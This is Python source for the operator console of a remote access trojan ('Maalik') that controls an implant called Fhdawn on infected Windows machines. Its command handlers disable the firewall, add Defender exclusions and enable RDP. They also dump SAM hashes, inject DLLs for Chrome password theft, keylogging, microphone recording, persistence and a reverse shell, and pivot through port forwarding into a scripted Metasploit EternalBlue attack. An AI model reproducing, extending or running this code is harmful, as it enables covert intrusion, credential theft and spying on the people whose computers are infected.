"""
Have a good time reading the source. You're an amazing person.
If you decide to copy, Don't forget to give me credit.
"""

import socket
import _thread
import configparser
from colorama import Fore, Style
import colorama
import os
from .other import *
from .updates import current_version
from .msf import *
import time
import subprocess
import sys
import random
from .builder import *
from prompt_toolkit import prompt

clients = [] # A List for client sockets
hostList = [] # A list for Client userpcs
iplist = [] # A List for Client IP's and Port as string
log = [] # Must not exceed 1

silent = False
shellmode = False  # ( ͡° ͜ʖ ͡°)
elevated = False
sessionStatus = False 

class ClientManage:
    def __init__(self, client_socket):
        self.client_socket = client_socket

    global iplist
    remote_hosts_list = [] # List of scanned hosts
    open_ports_list = [] # List of open ports
    attack_host = [] # The host set to attack, must not exceed 1
    attack_port = [] # The port set to attack, must not exceed 1
    exploit_port = [] # The port used for exploitation, must not exceed 1
    global elevated
    global sessionStatus
    def Log(self, data):
        del log[:]
        log.append(data)

    def clearLog(self):
        del log[:]

    def returnClientInfo(self):
        """
        return basic client information
        """
        location = clients.index(self.client_socket)
        return "Index : " + str(location) + " - IP : " + str(iplist[location]) + " - " + hostList[location]

    def SendData(self, data):
        try:
            self.client_socket.send(data.encode())
        except Exception as error:
            self._clearKick()
            print("Error Occured : " + str(error))

    def SendBytes(self, data):
        try:
            self.client_socket.send(data)
        except Exception as error:
            self._clearKick()
            print("Error Occured : " + str(error))

    def _clearKick(self):
        '''
        clear lists and kick
        '''
        global sessionStatus
        try:
            if(sessionStatus):
                print( Style.BRIGHT + Fore.RED + "[ Session Closed ] " + Style.RESET_ALL + self.returnClientInfo())
                sessionStatus = False
            location = clients.index(self.client_socket)
            clients.remove(clients[location])
            iplist.remove(iplist[location])
            hostList.remove(hostList[location])
        except Exception as unkown_error:
            print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Error : " + str(unkown_error))
        

    def BuildPayload(self, payload):
        os.chdir("../payloads")
        print("[+] Building {x}..".format(x = payload.capitalize()))
        subprocess.call("mingw32-make {x}".format(x= payload),stdout=subprocess.PIPE)

    def Session(self):
        global silent
        global shellmode
        global sessionStatus

        def AutoAttack():
            # Get all settings
            # Forward port
            # Create Metasploit RC File.
            # Run the Metasploit RC File.
            #if(elevated):
            if(self.attack_port[0] == "445"):
                cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                    lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
                )
                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
                print("[+] Forwarding Port.")

                
                
                self.SendData("cmd.exe /c " + cmdstr)
                self.WaitForReply()
                time.sleep(2)
                print("[+] Disabling firewall.")
                
                self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                self.WaitForReply()
                with open("maalik_attack.rc", "w+") as rcfile:
                    rcfile.write("use exploit/windows/smb/ms17_010_eternalblue\n")
                    rcfile.write("set payload generic/shell_reverse_tcp\n")
                    rcfile.write("set LHOST 0.0.0.0\n")
                    rcfile.write("set RHOST " + str(ip.split(":")[0]) + "\n")
                    rcfile.write("set RPORT " + str(self.exploit_port[0]) + "\n")
                    rcfile.write("run")

                try:
                    subprocess.call(["msfconsole", "-r", "maalik_attack.rc"])
                    
                    self.SendData("cmd.exe /c netsh interface portproxy reset")
                    self.WaitForReply()
                    print("[+] Enabling firewall.")
                    
                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
                    self.WaitForReply()
                    
                except OSError as e:
                    if e.errno == errno.ENOENT:
                        print("[X] Failed to run Metasploit, Is it installed?")
                    else:
                        print("[X] Failed to run Metasploit, Error : " + str(e))
                
            else:
                print("[*] Incompatible port for Auto Pivot Exploit.")
                print("[*] Supported Ports is 445 (smb) for Eternalblue.")
            # else:
            #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")
        def Attack():
            # if(elevated):
            if(len(self.exploit_port) == 0):
                self.exploit_port.append(random.randint(1000, 9000))
            else:
                cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                    lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
                )
                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
                print("[+] Forwarding Port.")

                
                
                self.SendData("cmd.exe /c " + cmdstr)
                self.WaitForReply()
                time.sleep(2)
                print("[+] Disabling firewall.")
                
                self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                self.WaitForReply()
                print("[+] Run your Exploits on " + ip.split(":")[0] + " on Port " + str(self.exploit_port[0]) + ".")
                print("[+] All Traffic sent on " + ip.split(":")[0] + ":" + str(self.exploit_port[0]) + " will be forwarded to " + self.attack_host[0] + ":" + self.attack_port[0])
                print("[*] Press CTRL+C when Done.")
                while(True):
                    try:
                        prompt("")
                    except KeyboardInterrupt:
                        
                        self.SendData("cmd.exe /c netsh interface portproxy reset")
                        self.WaitForReply()
                        
                        break
            # else:
            #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.")

        def filetransfer(mfile = None, rfile=None):
            if(mfile == None and rfile == None):
                mfile = prompt("[+] File Path : ")
                rfile = prompt("[+] File name to Save as : ")
                
            if(":" in rfile):
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ':' is forbidden in filename.")
            else:
                try:
                    with open(mfile, "rb") as sendfile:
                        data = sendfile.read()
                        bufferst = os.stat(mfile)
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                        
                        self.SendData("frecv") # Send File Receive trigger for client
                        trigger = rfile + ":" + str(bufferst.st_size) 
                        time.sleep(1)
                        self.SendData(trigger) # Send Trigger
                        self.SendBytes(data) # Send file
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                        self.WaitForReply()
                except FileNotFoundError:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '{file}' not found!?".format(file = mfile))
                except Exception as e:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
        
        def DLLTransfer(mfile=None, proc=None):
            if(mfile == None and proc == None):
                mfile = prompt("[+] DLL Path : ")
                proc = prompt("[+] Process Name : ")
            try:
                with open(mfile, "rb") as sendfile:
                    data = sendfile.read()
                    bufferst = os.stat(mfile)
                    #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                    
                    self.SendData("fdll") # Send File Receive trigger for client
                    time.sleep(1)
                    trigger =  "maalik" + ":" + str(bufferst.st_size) + ":" + proc
                    self.SendData(trigger) # Send Trigger
                    self.SendBytes(data) # Send file
                    #print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                    self.WaitForReply()
            except FileNotFoundError:
                print("[X] '{file}' not found!?".format(file = mfile))
            except Exception as e:
                print("[X] Error : " + str(e))

        def DLLGetOutput():
            self.SendData("dlloutput")
            self.WaitForReply()

        def SendPayloadCommand(strr):
            self.SendData("frecv")
            self.SendData("output.png:"+str(len(strr)))
            time.sleep(1)
            self.SendData(strr)
            self.WaitForReply()

        def RemovePayloadCommand():
            self.SendData("delete:output.png")
            self.WaitForReply()

        def PrintPayloadOutput():
            self.SendData("fupload:output.png")
            self.WaitForReply()
            time.sleep(2)
            if(os.path.isfile("downloads/output.png")):
                print("[+] Output : ")
                PrintTextFile("downloads/output.png")
            else:
                print("[x] Failed to get payload output.")
                
        # if(session):
        #     silent = True
        #     self.SendData("isadmin") # check admin first 
        #     while(True):
        #         self.WaitForReply()
        #         silent = False
        #         time.sleep(2)
        #         print(str(elevated))
        #         if(elevated):
        #             print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} with Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
        #         else:
        #             print(Style.BRIGHT + Fore.GREEN + "[+]" + Style.RESET_ALL + " Interacting with Session {x} on {upc} without Administrator Access ..." .format(x = iplist[clients.index(self.client_socket)], upc = hostList[clients.index(self.client_socket)]))
        
        sessionStatus = True
        while(sessionStatus):
            try:
                try:
                    location = clients.index(self.client_socket)
                    if not shellmode:
                        shellmode = True

                except ValueError:
                    print("[X] Client disconnected unexpectedly, Session closed.")
                    shellmode = False
                    session = False
                    break
                ip = iplist[location]
                main = prompt("maalik >> ({ip}) : ".format(ip = ip))
                if(main == "ls"):
                    
                    self.SendData("listdir")
                    self.WaitForReply()
                    
                elif(main == "osinfo"):
                    self.SendData("systeminfo")
                    self.WaitForReply()
                elif(main.startswith("cd")):
                    sp = main.split()
                    try:
                        self.SendData("cd")
                        self.SendData(sp[1])
                        self.WaitForReply()
                    except IndexError:
                        print(Style.BRIGHT + Fore.RED + "[X] Error : Usage is cd < dir > ")
                elif(main == "execute"):
                    filename = prompt("[:] Enter Filename to Execute : ")
                    if(len(filename) > 0):
                        self.SendData("exec")
                        self.SendData(filename)
                 
                elif(main == "execargs"):
                    filename = prompt("[:] Enter Filename to Execute : ")
                    args = prompt("[:] Command line arguments : ")
                    if(len(filename) > 0 and len(args) > 0):
                        self.SendData("execargs:"+filename+":"+args)
                        self.WaitForReply()
                elif(main == "shell"):
                    shell = True
                    
                    while (shell):
                        sh = prompt("( " + ip.split(":")[0].strip() + "@" + hostList[location].split("/")[0].strip() + " ) > ")
                        if(len(sh) > 0):
                            if(sh != "exit"):
                                self.SendData("cmd.exe /c "+ sh)
                                self.WaitForReply()
                            else:
                                shell = False
                                
                                break
                            
                elif(main == "exit"):
                    shellmode = False
                    session = False
                    break

                elif(main == "delete"):
                    dlt = prompt("[:] Enter Filename to Delete : ")
                    if(len(dlt) > 0):
                        self.SendData("delete:"+dlt)
                        self.WaitForReply()
                elif(main == "process_monitor"):
                    self.PROCESS_MONITOR()
                elif(main == "dir_monitor"):
                    self.DIRMONITOR(None)

                elif(main == "netuser"):
                    
                    self.SendData("cmd.exe /c net user")
                    self.WaitForReply()
                elif(main == "driverquery"):
                    
                    self.SendData("cmd.exe /c driverquery")
                    self.WaitForReply()
                elif(main == "tasklist"):
                    
                    self.SendData("cmd.exe /c tasklist")
                    self.WaitForReply()
                elif(main == "drives"):
                    
                    self.SendData("cmd.exe /c fsutil fsinfo drives")
                    self.WaitForReply()
                elif(main == "set"):
                    
                    self.SendData("cmd.exe /c set")
                    self.WaitForReply()
                elif(main == "qwinsta"):
                    
                    self.SendData("cmd.exe /c qwinsta")
                    self.WaitForReply()
                elif(main.startswith("port_scan")):
                    if(len(self.attack_host) > 0):
                        ip = self.attack_host[0]
                    else:
                        ip = prompt("[+] Enter IP : ")
                    if(len(ip) > 0):
                        silent = True
                        while(True):
                            try:
                                with open("common_ports", "r") as commonportlist:
                                    lines = commonportlist.readlines()
                                    for line in lines:
                                        port = line.split(" ")[1].strip()
                                        self.SendData("checkport")
                                        self.SendData(ip +","+port)
                                        time.sleep(2)
                                    break
                            except KeyboardInterrupt:
                                silent = False
                                break

                elif ( main == "clientinfo"):
                    self.SendData("clientinfo")
                    self.WaitForReply()
                elif ( main == "netshall"):
                    
                    self.SendData("cmd.exe /c netsh wlan show all")
                    self.WaitForReply()
                elif ( main == "windefender_exclude"):
                    path = prompt("[+] Path on Remote PC ( File / Folder ) : ")
                    if(len(path) > 0):
                        #if(elevated == True):
                        # self.SendData("exclude")
                        # self.SendData(path)
                        strs = "cmd.exe /c powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath '{s}'".format(s = path)
                        self.SendData(strs)
                        time.sleep(3)
                        print("[+] Exclusion added.") # Not checking it.. according to my tests, It works. 
                        # But I should add checking
                        # how can we check for exlcusions O_o
                        # else:
                        #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first.") 

                elif ( main == "systeminfo"):
                    self.SendData("systeminfo")
                    self.WaitForReply()

                elif ( main == "rdp_enable"):
                    
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop on.")
                    
                    self.SendData('cmd.exe /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
                    self.WaitForReply()
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Disabling Firewall.")
                    
                    self.SendData('cmd.exe /c netsh advfirewall firewall set rule group="remote desktop" new enable=yes')
                    self.WaitForReply()
                    

                elif ( main == "rdp_disable" ):
                    
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop off.")
                    
                    self.SendData('cmd.exe /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
                    self.WaitForReply()
                    
                    
                elif ( main == "portfwd"):
                    cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}"
                    listen_port = prompt("[+] Enter Port to Listen for Connection : ")
                    connect_addr = prompt("[+] Enter Host to Forward Connection to : ")
                    connect_port = prompt("[+] Enter Port to Forward Connection to : ")
                    newstr = cmdstr.format(lp = listen_port, cp = connect_port, ca = connect_addr)
                    print(newstr)
                    
                    self.SendData("cmd.exe /c " + newstr)
                    self.WaitForReply()

                elif( main == "portfwd_reset"):
                    
                    self.SendData("cmd.exe /c netsh interface portproxy reset")
                    self.WaitForReply()
                elif( main == "network_scan"):
                    try:
                        iprange = prompt("[^] Enter Range (eg: 192.168.0.1/24) : ")
                        scanRange = iprange.split("/")
                        start = scanRange[0]
                        get = start.split(".")
                        end = scanRange[1]
                        xip = get[3]
                        base = get[0] +"."+ get[1] +"."+ get[2] +"."
                        
                        try:
                            for i in range(int(xip), int(end)):
                                if not silent:
                                    silent = True
                                ip_toscan = base + str(i)
                                #print("Scanning : " + ip_toscan)
                                self.SendData("checkhost")
                                self.SendData(ip_toscan)
                                self.WaitForReply()
                            silent = False
                        except KeyboardInterrupt:
                            silent = False
                    except Exception as e:
                        print("[X] Error : " + str(e))
                    
                elif(main == "show targets"):
                    if(len(self.remote_hosts_list) > 0):
                        for host in self.remote_hosts_list:
                            print("[" + Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + host)
                    else:
                        print("[" + Style.BRIGHT + Fore.RED + "x" + Style.RESET_ALL + "] Error : No Hosts scanned.")
                        
                elif(main == "clear_hosts"):
                    confirm = prompt("[X] Confirm Clear hosts? You will need to Rescan! (y/n) : ")
                    if(confirm.lower() == "y"):
                        del self.remote_hosts_list[:]

                elif ( main == "clear_ports"):
                    confirm = prompt("[X] Confirm Clear Ports? You will need to Rescan! (y/n) : ")
                    if(confirm.lower() == "y"):
                        del self.open_ports_list[:]
                
                elif(main.startswith("set target")):
                    try:
                        
                        parse = main.split(" ")
                        target = parse[2]
                        if(len(self.attack_host) > 0):
                            print("[+] Removing " + self.attack_host[0] + " as set target.")
                            del self.attack_host[:]
                        self.attack_host.append(target)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Target => " + self.attack_host[0])
                    except Exception as e:
                        print("Error : " + str(e))

                elif(main.startswith("set attackport")):
                    try:
                        
                        parse = main.split(" ")
                        atport = parse[2]
                        if(len(self.attack_port) > 0):
                            print("[+] Removing " + self.attack_port[0] + " as set Attack Port.")
                            del self.attack_port[:]
                        self.attack_port.append(atport)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Attack Port => " + self.attack_port[0])
                    except Exception as e:
                        print("Error : " + str(e))                    

                elif(main.startswith("set exploitport")):
                    try:
                        parse = main.split(" ")
                        export = parse[2]
                        if(len(self.exploit_port) > 0):
                            print("[+] Removing " + self.exploit_port[0] + " as set Exploit Port.")
                            del self.exploit_port[:]
                        self.exploit_port.append(export)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Exploit Port => " + self.exploit_port[0])
                    except Exception as e:
                        print("Error : " + str(e))  

                elif(main == "show info"):

                    def GetPorts(target):
                        x = []
                        ret = ""
                        for i in self.open_ports_list:
                            if target in i:
                                x.append(i)

                        for showport in x:
                            ret += showport.split(":")[1] + "\n"

                        return ret
                    try:
                        if(len(self.attack_host) > 0):
                       
                            infomsg = """
Target IP : {targetip}
Open Ports
---------------------
{openports}
                        """.format(targetip = self.attack_host[0],openports = GetPorts(self.attack_host[0]))
                            print(infomsg)
                        else:
                            print("[X] No Target is set.")
                    except Exception as e:
                        print("Error : " + str(e))

                elif(main == "show options"):
                    attackIP = ""
                    attackport = ""
                    randport = 0
                    if(len(self.attack_host) > 0):
                        attackIP = self.attack_host[0]
                    else:
                        attackIP = None

                    if(len(self.attack_port) > 0):
                        attackport = self.attack_port[0]
                    else:
                        attackport = None

                    if(len(self.exploit_port) > 0):
                        randport = self.exploit_port[0]
                    else:
                        randport = random.randint(1000, 9000)

                    help_msg = r"""
        Maalik Options

        Attack Target
        --------------
        {attackIP}

        Attack Port
        -----------
        {attackport}

        Exploit Port
        -----------
        {randport} (default is random)

        Attack Details
        --------------
        [ Exploit ] --> {clientip}:{randport} --> {attackIP}:{attackport}

                    """.format(clientip = Style.BRIGHT + ip.split(":")[0], attackIP = attackIP, attackport = attackport, randport = randport)

                    print(help_msg)

                elif(main == "run"):
                    try:
                        Attack()
                    except IndexError:
                        print('[X] One or more required values are not set.')
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif(main == "run autoblue"):
                    try:
                        if(len(self.exploit_port) > 0):
                            pass
                        else:
                            self.exploit_port.append(random.randint(1000, 9000))
                        
                        AutoAttack()
                    except IndexError:
                        print('[X] One or more required values are not set.')
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif(main == "firewall_on"):
                    
                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
                    self.WaitForReply()

                elif(main == "firewall_off"):
                    
                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                    self.WaitForReply()
                    
                elif(main == "tasklist"):
                    
                    
                    self.SendData("cmd.exe /c tasklist")
                    self.WaitForReply()
                    

                elif(main == "taskkill"):
                    processname = prompt("[?] Enter Process name : ")
                    if(len(processname) > 0):
                        
                        self.SendData("cmd.exe /c taskkill /IM " + processname + " /F")
                        self.WaitForReply()
                        
                elif(main == "host_sweep"):
                    try:
                        if((len(self.remote_hosts_list)) > 0):
                            for host in self.remote_hosts_list:
                                self.SendData("gethostname")
                                self.SendData(host.strip().split("-")[0])
                                self.WaitForReply()
                    except Exception as e:
                        print("[X] Error : " + str(e))
                
                elif(main == "host_sweep -h"):
                    try:
                        ip = prompt("[?] Enter IP : ")
                        if(len(ip) > 0):
                            self.SendData("gethostname")
                            self.SendData(ip)
                            self.WaitForReply()
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif(main == "upload"):
                    
                    filetransfer()
                    time.sleep(2)

                elif(main == "download"):
                    filename = prompt("[+] File : ")
                    if(len(filename) > 0):
                        self.SendData("fupload:"+filename)
                        self.WaitForReply()
                        time.sleep(5)

                elif(main == "psinfo"):
                    name = prompt("[+] Enter Process name : ")
                    if(len(name) > 0):
                        self.SendData("psinfo:"+name)
                        self.WaitForReply()

                elif(main == "fhdawn_info"):
                    self.SendData("fhdawnpid")
                    self.WaitForReply()

                elif(main == "isadmin"):
                    self.SendData("isadmin")
                    self.WaitForReply()

                elif(main == "geolocate"):
                    self.SendData("wanip")
                    self.WaitForReply()

                elif(main == "eternalblue_scan"):
                    try:
                        if((len(self.remote_hosts_list)) > 0):
                            for host in self.remote_hosts_list:
                                self.SendData("eternal_scan:"+host.split("-")[0].strip())
                                self.WaitForReply()
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif(main == "eternalblue_scan -h"):
                    try:
                        ip = prompt("[?] Enter Host IP : ")
                        if(len(ip) > 0):
                            self.SendData("eternal_scan:"+ip)
                            self.WaitForReply()
                    except Exception as e:
                        print("[X] Error : " + str(e))
                
                elif(main == "dllinject"):
                    
                    DLLTransfer()
                    
                elif(main == "help"):
                    print(help)

                elif(main == "samdump"):
                    #if(elevated):
                    self.SendData("cmd.exe /c reg save hklm\sam sam")
                    self.WaitForReply()
                    self.SendData("cmd.exe /c reg save hklm\system system")
                    self.WaitForReply()
                    self.SendData("fupload:sam")
                    self.WaitForReply()
                    self.SendData("fupload:system")
                    self.WaitForReply()
                    self.SendData("delete:sam")
                    self.WaitForReply()
                    self.SendData("delete:system")

                    if(os.path.isfile("downloads/sam")):
                        if(os.path.isfile("downloads/system")):
                            subprocess.call(["samdump2", "downloads/system", "downloads/sam"]) # works on kali without errors
                            os.remove("downloads/system")
                            os.remove("downloads/sam")
                        else:
                            print("[+] Error dumping system.")
                    else:
                        print("[+] Error dumping sam.")
                    # else:
                    #     print(Style.BRIGHT + Fore.RED + "[x]" + Style.RESET_ALL + " Fhdawn does not have Admin rights. Elevate first..")
                
                elif (main == "addpersistence"):
                    app = input("[+] Enter Application name / path to add startup key : ")
                    if(len(app) > 0):
                        SendPayloadCommand(app)
                        DLLTransfer("payloads/persist.dll", setting('inject_process'))
                        time.sleep(2)
                        PrintPayloadOutput()
                        RemovePayloadCommand()
                        if(os.path.isfile("downloads/output.png")):
                            os.remove("downloads/output.png")
                    
                elif(main == "capturemic"):
                    seconds = prompt("[?] Recording time in seconds : ")
                    SendPayloadCommand(seconds)
                    DLLTransfer("payloads/capturemic.dll",setting('inject_process'))
                    print("[+] Recording microphone prompt ...")
                    time.sleep(int(seconds)+ 2)
                    self.SendData("fupload:"+ hostList[location].split("/")[1].strip() + ".wav")
                    self.WaitForReply()
                    self.SendData("delete:"+hostList[location].split("/")[1].strip() + ".wav")
                    self.WaitForReply()
                    RemovePayloadCommand() # important
                    
                elif(main == "dropmsf"):
                    os.chdir("payloads")
                    build_msf_dll()
                    os.chdir("..")
                    DLLTransfer("payloads/msf.dll", setting('inject_process'))
                    
                elif(main == "screenshot"):
                    self.SendData("screenshot")
                    self.WaitForReply()
                elif(main == "runasadmin"):
                    # print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                    app = prompt("[+] Application name : ")
                    if(len(app) > 0):
                        SendPayloadCommand(app)
                        DLLTransfer("payloads/runasadmin.dll", setting('inject_process')) # Inject elevate.dll 
                        RemovePayloadCommand()
                        
                elif(main == "chromedump"):
                    # print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                    DLLTransfer("payloads/ChromeDump.dll", setting('inject_process')) # Inject ChromeDump.dll
                    credfile = hostList[location].split("/")[0].strip()
                    self.SendData("fupload:"+credfile)
                    time.sleep(2)
                    self.SendData("delete:"+credfile)
                    self.WaitForReply()
                    print("-------------------------")
                    PrintTextFile("downloads/"+credfile)
                    print("-------------------------")
                    print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Saved in 'downloads/"+credfile+"'")

                elif(main == "rshell"):
                    host = prompt("[+] Reverse Host : ")
                    port = prompt("[+] Reverse Port : ")
                    if(len(host) > 0):
                        if(len(port) > 0):
                            SendPayloadCommand(host+":"+port)
                            DLLTransfer("payloads/ncshell.dll", setting('inject_process'))
                            self.WaitForReply()
                            RemovePayloadCommand()
                elif(main == "keylog_start"):
                    DLLTransfer("payloads/keylogger.dll", setting('inject_process'))

                elif(main == "keylog_stop"):
                    SendPayloadCommand("KEYLOGSTOP")
                    time.sleep(2)
                    RemovePayloadCommand()
                    self.SendData("fupload:log.log")
                    self.WaitForReply()
                    self.SendData("delete:log.log")
                    self.WaitForReply()
                    print("-------------------------")
                    PrintTextFile("downloads/log.log")
                    print("-------------------------")
                    try:
                        os.remove("downloads/log.log")
                    except FileNotFoundError:
                        print("[X] No Logs were written.")

            except KeyboardInterrupt:
                print("[X] Interrupt, Type exit to Exit session.")

    def WaitForReply(self):
        """
        Wait 20 seconds for Message from Client
        """
        self.clearLog() # Clear log list
        x = 0 # x is 0
        while(x != 20): # while x is not 20
            try: 
                if(len(log) > 0): # If length of log is greater than 0, means message received. So break the loop
                    break # break here
                time.sleep(0.5) # Sleep 0.5 second
                x += 1 # Add one to x
                if(x == 20):
                    print( Style.BRIGHT + Fore.RED + "[i]" + Style.RESET_ALL + " 20 seconds have passed and we have received no response from Fhdawn. There may be a problem.")
            except KeyboardInterrupt:
                break # Keyboard interrupt, Breaks the loop.

    def ClientThread(self):
        
        """
        Receive data from client
        """
        global silent
        global shellmode

        def uniquify(path):
            """
            Credits : https://stackoverflow.com/questions/13852700/create-file-but-if-name-exists-add-number/57896232#57896232
            """
            filename, extension = os.path.splitext(path)
            counter = 1

            while os.path.exists(path):
                path = filename + " (" + str(counter) + ")" + extension
                counter += 1

            return path

        while(True):
            try:
                client_data = self.client_socket.recv(1024).decode()
                
                if(not client_data):
                    self._clearKick()
                    break 

                self.Log(client_data)

                try:
                    indexof = clients.index(self.client_socket)
                    ips = iplist[indexof]
                except Exception as e:
                    print("[X] Error : " + str(e))
                    pass
                
                # Fhdawn reporting an Open Port on a Host
                if(client_data.startswith("OPENPORT")):
                    # OPENPORT:IP,Port
                    parse = client_data.split(":")
                    ip_port = str(parse[1]).split(",")
                    with open("common_ports", "r") as portlist:
                        lines = portlist.readlines()
                        for line in lines:
                            if(ip_port[1] in line):
                                # if port in list
                                ipport = ip_port[0] + ":" + ip_port[1]
                                print("["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + ipport + Style.BRIGHT + Fore.GREEN + " <--> " + Style.RESET_ALL + line )
                                if(ipport not in self.open_ports_list):
                                    self.open_ports_list.append(ipport)
                                break
                      
                elif(client_data.startswith("[HOST]")):
                    hostinfo = client_data.replace("[HOST]", "")
                    print("[" + Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + hostinfo)
                    if("-pc" in hostinfo.lower()): # batman-PC
                        print(" |_ "+ Style.BRIGHT + Fore.GREEN + " OS " + Style.RESET_ALL + " : Windows (Just guessing)")
                    if(hostinfo not in self.remote_hosts_list):
                        self.remote_hosts_list.append(hostinfo)
                
                # Fhdawn wants to send us a file
                elif(client_data.startswith("FILE")):
                    try:
                        fileinfo = client_data.split(":") #FILE:filename.txt:555
                        #print(fileinfo)
                        filename = fileinfo[1]
                        filesize = int(fileinfo[2])
                        SaveFile = "downloads/"+ filename
                        FinalF = uniquify(SaveFile)

                        with open(FinalF, "wb") as incoming_file:
                            data = self.client_socket.recv(4096)
                           
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
                            while(len(data) != filesize):
                                data += self.client_socket.recv(filesize - len(data))  
                                #print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                if not data: break
                            incoming_file.write(data)
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded '{fl}' => '{fd}'".format(fl=filename, fd=FinalF))

                    except Exception as e:
                        print("[X] Error : " + str(e))
                        print("[i] File Download Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                # Get Process information
                elif(client_data.startswith("PROCESS")):
                    try:
                        fileinfo = client_data.split(",") # split info by comma
                        print(
                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Process '{p}' running at PID '{pid}' Path on disk '{pth}' ..."
                            .format(p = fileinfo[1], pid = fileinfo[2], pth = fileinfo[3]))

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Process Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                elif(client_data.startswith("FHDAWNPID")):
                    try:
                        fileinfo = client_data.split(":") # split info by comma
                        self.SendData("psinfo:"+fileinfo[1])

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Process Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                elif(client_data.startswith("ADMIN")):
                    try:
                        fileinfo = client_data.split(":") 
                        
                        if(fileinfo[1] == "TRUE"):
                            elevated = True
                        else:
                            elevated = False
                            
                        if(not silent):
                            print(
                                Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Administrator : " + fileinfo[1].lower())
                        
                        
                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Process Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                    
                # Get screenshot, Convert to png and save
                elif(client_data.startswith("SCREENSHOT")):
                    try:
                        fileinfo = client_data.split(":") #SCREENSHOT:filename.txt:555
                        #print(fileinfo)
                        filename = hostList[indexof].split("/")[1].replace(" ","") + "-" + fileinfo[1]
                        filesize = int(fileinfo[2])
                        SaveFile = "downloads/"+ filename
                        FinalF = uniquify(SaveFile).replace("bmp", "png")

                        with open(FinalF, "wb") as incoming_file:
                            data = self.client_socket.recv(4096)
                           
